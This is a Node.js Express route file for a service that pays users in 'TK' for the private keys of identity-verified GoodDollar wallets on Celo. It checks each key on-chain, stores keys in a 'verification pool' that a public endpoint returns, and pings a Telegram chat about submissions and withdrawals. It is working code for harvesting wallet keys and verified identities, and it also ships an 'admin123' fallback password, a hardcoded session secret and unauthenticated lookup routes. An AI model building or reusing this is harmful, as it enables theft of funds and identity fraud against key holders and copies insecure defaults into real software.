import { createServer } from "http";
import session from "express-session";
import { storage } from './storage.js';
import { ethers } from "ethers";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
const GD_IDENTITY_ADDRESS = "0xC361A6E67822a0EDc17D899227dd9FC50BD62F42";
const CELO_RPC = "https://forno.celo.org";
const GD_IDENTITY_ABI = [
    "function isWhitelisted(address account) view returns (bool)",
];
async function sendTelegramMessage(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID)
        return;
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "HTML",
            }),
        });
    }
    catch (err) {
        console.error("Telegram error:", err);
    }
}
export async function registerRoutes(app) {
    app.use(session({
        secret: process.env.SESSION_SECRET || "secure-earn-secret-key",
        resave: false,
        saveUninitialized: false,
        cookie: {
            secure: false,
            httpOnly: true,
            maxAge: 7 * 24 * 60 * 60 * 1000,
        },
    }));
    // Auth routes
    app.post("/api/login", async (req, res) => {
        try {
            const { guestId, displayName } = req.body;
            if (!guestId || guestId.trim().length < 3) {
                return res.status(400).json({ message: "Invalid guest ID" });
            }
            let user = await storage.getUserByGuestId(guestId.trim());
            const isNew = !user;
            if (!user) {
                user = await storage.createUser({
                    guestId: guestId.trim(),
                    displayName: displayName || null,
                });
            }
            if (user.isBlocked) {
                return res.status(403).json({ message: "Account is blocked" });
            }
            req.session.userId = user.id;
            return res.status(isNew ? 201 : 200).json(user);
        }
        catch (err) {
            console.error("Login error:", err);
            return res.status(500).json({ message: "Internal server error" });
        }
    });
    app.post("/api/logout", (req, res) => {
        req.session.destroy(() => {
            res.json({ message: "Logged out" });
        });
    });
    app.get("/api/user", async (req, res) => {
        if (!req.session.userId) {
            return res.status(401).json({ message: "Unauthorized" });
        }
        const user = await storage.getUser(req.session.userId);
        if (!user)
            return res.status(401).json({ message: "User not found" });
        return res.json(user);
    });
    // Submit key
    app.post("/api/submit-key", async (req, res) => {
        if (!req.session.userId) {
            return res.status(401).json({ message: "Unauthorized" });
        }
        try {
            const { privateKey } = req.body;
            if (!privateKey) {
                return res.status(400).json({ message: "Private key required" });
            }
            const user = await storage.getUser(req.session.userId);
            if (!user)
                return res.status(401).json({ message: "User not found" });
            if (user.isBlocked)
                return res.status(403).json({ message: "Account blocked" });
            // Check if key already used
            const isUsed = await storage.isKeyUsed(privateKey);
            if (isUsed) {
                return res.status(400).json({ message: "This key has already been used" });
            }
            // Verify on Celo
            let wallet;
            try {
                wallet = new ethers.Wallet(privateKey);
            }
            catch {
                return res.status(400).json({ message: "Invalid private key format" });
            }
            const provider = new ethers.JsonRpcProvider(CELO_RPC);
            const contract = new ethers.Contract(GD_IDENTITY_ADDRESS, GD_IDENTITY_ABI, provider);
            const isWhitelisted = await contract.isWhitelisted(wallet.address);
            if (!isWhitelisted) {
                return res.status(400).json({ message: "This GoodDollar address is not verified" });
            }
            // Get reward rate
            const rewardRateSetting = await storage.getSetting("rewardRate");
            const rewardRate = rewardRateSetting ? parseInt(rewardRateSetting) : 40;
            // Credit user
            const updatedUser = await storage.updateUserBalance(user.id, rewardRate);
            await storage.updateUserKeyCount(user.id, 1);
            await storage.createTransaction({
                userId: user.id,
                type: "earning",
                amount: rewardRate,
                details: `Key: ${wallet.address} | Key: ${privateKey.substring(0, 10)}...`,
                status: "completed",
            });
            await sendTelegramMessage(`🔑 <b>New Key Submitted</b>\nUser: ${user.guestId}\nAddress: ${wallet.address}\nReward: +${rewardRate} TK`);
            return res.json({
                success: true,
                newBalance: updatedUser.balance,
                message: `Key verified! +${rewardRate} TK added`,
            });
        }
        catch (err) {
            console.error("Submit key error:", err);
            return res.status(500).json({ message: "Failed to verify key" });
        }
    });
    // Withdraw
    app.post("/api/withdraw", async (req, res) => {
        if (!req.session.userId) {
            return res.status(401).json({ message: "Unauthorized" });
        }
        try {
            const { method, number, amount } = req.body;
            const user = await storage.getUser(req.session.userId);
            if (!user)
                return res.status(401).json({ message: "User not found" });
            if (user.isBlocked)
                return res.status(403).json({ message: "Account blocked" });
            if (user.balance < amount)
                return res.status(400).json({ message: "Insufficient balance" });
            if (amount < 50)
                return res.status(400).json({ message: "Minimum withdrawal is 50 TK" });
            const updatedUser = await storage.updateUserBalance(user.id, -amount);
            await storage.createTransaction({
                userId: user.id,
                type: "withdrawal",
                amount,
                details: `${method.toUpperCase()}: ${number}`,
                status: "pending",
            });
            await sendTelegramMessage(`💸 <b>Withdrawal Request</b>\nUser: ${user.guestId}\nMethod: ${method}\nNumber: ${number}\nAmount: ${amount} TK`);
            return res.json({
                success: true,
                newBalance: updatedUser.balance,
                message: `Withdrawal of ${amount} TK requested`,
            });
        }
        catch (err) {
            console.error("Withdraw error:", err);
            return res.status(500).json({ message: "Withdrawal failed" });
        }
    });
    // Transactions
    app.get("/api/transactions", async (req, res) => {
        if (!req.session.userId) {
            return res.status(401).json({ message: "Unauthorized" });
        }
        const transactions = await storage.getUserTransactions(req.session.userId);
        return res.json(transactions);
    });
    // Check duplicates
    app.post("/api/check-duplicates", async (req, res) => {
        const { numbers } = req.body;
        if (!Array.isArray(numbers))
            return res.json({ duplicates: [] });
        const existing = await storage.getExistingSubmittedPhoneNumbers();
        const duplicates = numbers.filter((n) => existing.includes(n));
        return res.json({ duplicates });
    });
    // Lookup users
    app.post("/api/lookup-users", async (req, res) => {
        const { numbers } = req.body;
        if (!Array.isArray(numbers))
            return res.json([]);
        const results = await Promise.all(numbers.map(async (num) => {
            const user = await storage.getUserByGuestId(num);
            return { phoneNumber: num, keyCount: user?.keyCount || 0, balance: user?.balance || 0 };
        }));
        return res.json(results);
    });
    // User payment feedback
    app.post("/api/user/payment-feedback", async (req, res) => {
        if (!req.session.userId)
            return res.status(401).json({ message: "Unauthorized" });
        const { received } = req.body;
        const status = received ? "received" : "not_received";
        const user = await storage.updateUserPaymentStatus(req.session.userId, status);
        return res.json(user);
    });
    // Add key (public endpoint for key contributors)
    app.post("/api/add-key", async (req, res) => {
        const { privateKey, verifyUrl, addedBy } = req.body;
        if (!privateKey || !verifyUrl) {
            return res.status(400).json({ message: "Private key and verify URL required" });
        }
        await storage.addVerificationKey(privateKey, verifyUrl, addedBy || "Unknown");
        return res.json({ success: true });
    });
    // Pool stats (public)
    app.get("/api/pool-stats", async (_req, res) => {
        const pool = await storage.getVerificationPool();
        return res.json(pool);
    });
    // Admin routes
    app.post("/api/admin/login", (req, res) => {
        const { password } = req.body;
        if (password === ADMIN_PASSWORD) {
            req.session.isAdmin = true;
            return res.json({ success: true });
        }
        return res.status(401).json({ message: "Invalid password" });
    });
    const requireAdmin = (req, res, next) => {
        if (!req.session.isAdmin) {
            return res.status(401).json({ message: "Unauthorized" });
        }
        next();
    };
    app.get("/api/admin/users", requireAdmin, async (_req, res) => {
        const users = await storage.getAllUsers();
        return res.json(users);
    });
    app.post("/api/admin/users/:id/toggle-block", requireAdmin, async (req, res) => {
        const { isBlocked } = req.body;
        const user = await storage.setUserBlockedStatus(parseInt(req.params.id), isBlocked);
        return res.json(user);
    });
    app.get("/api/admin/withdrawals", requireAdmin, async (_req, res) => {
        const transactions = await storage.getAllTransactions();
        const withdrawals = transactions.filter((t) => t.type === "withdrawal");
        return res.json(withdrawals);
    });
    app.post("/api/admin/withdrawals/:id/status", requireAdmin, async (req, res) => {
        const { status } = req.body;
        const transaction = await storage.updateTransactionStatus(parseInt(req.params.id), status);
        return res.json(transaction);
    });
    app.post("/api/admin/users/:id/balance", requireAdmin, async (req, res) => {
        const { balance } = req.body;
        const user = await storage.updateUserBalanceDirectly(parseInt(req.params.id), balance);
        return res.json(user);
    });
    app.get("/api/admin/settings", requireAdmin, async (_req, res) => {
        const rewardRate = await storage.getSetting("rewardRate");
        return res.json({ rewardRate: rewardRate ? parseInt(rewardRate) : 40 });
    });
    app.post("/api/admin/settings", requireAdmin, async (req, res) => {
        const { rewardRate } = req.body;
        await storage.setSetting("rewardRate", String(rewardRate));
        return res.json({ success: true });
    });
    app.get("/api/admin/verification-pool", requireAdmin, async (_req, res) => {
        const pool = await storage.getVerificationPool();
        return res.json(pool);
    });
    app.delete("/api/admin/verification-pool/:id", requireAdmin, async (req, res) => {
        await storage.deleteVerificationKey(parseInt(req.params.id));
        return res.json({ success: true });
    });
    app.post("/api/admin/verification-pool/delete-used", requireAdmin, async (_req, res) => {
        const count = await storage.deleteUsedVerificationKeys();
        return res.json({ success: true, count });
    });
    app.get("/api/admin/submitted-numbers", requireAdmin, async (_req, res) => {
        const numbers = await storage.getSubmittedNumbers();
        return res.json(numbers);
    });
    app.post("/api/admin/submit-numbers", requireAdmin, async (req, res) => {
        const { numbers, submittedBy, paymentNumber, paymentMethod } = req.body;
        await storage.addSubmittedNumbers(numbers, submittedBy, paymentNumber, paymentMethod);
        return res.json({ success: true });
    });
    app.delete("/api/admin/submitted-numbers/:id", requireAdmin, async (req, res) => {
        await storage.deleteSubmittedNumber(parseInt(req.params.id));
        return res.json({ success: true });
    });
    app.post("/api/admin/submitted-numbers/clear", requireAdmin, async (_req, res) => {
        await storage.clearAllSubmittedNumbers();
        return res.json({ success: true });
    });
    app.get("/api/admin/reset-history", requireAdmin, async (_req, res) => {
        const history = await storage.getResetHistory();
        return res.json(history);
    });
    app.post("/api/admin/batch-reset", requireAdmin, async (req, res) => {
        const { numbers, submittedBy, paymentNumber, paymentMethod } = req.body;
        if (!Array.isArray(numbers) || numbers.length === 0) {
            return res.status(400).json({ message: "No numbers provided" });
        }
        for (const phoneNumber of numbers) {
            const user = await storage.getUserByGuestId(phoneNumber);
            if (user) {
                await storage.addResetHistory(phoneNumber, user.keyCount, submittedBy || "Admin", paymentNumber, paymentMethod);
                await storage.resetUserKeyCount(user.id);
            }
        }
        return res.json({ success: true, count: numbers.length });
    });
    const httpServer = createServer(app);
    return httpServer;
}
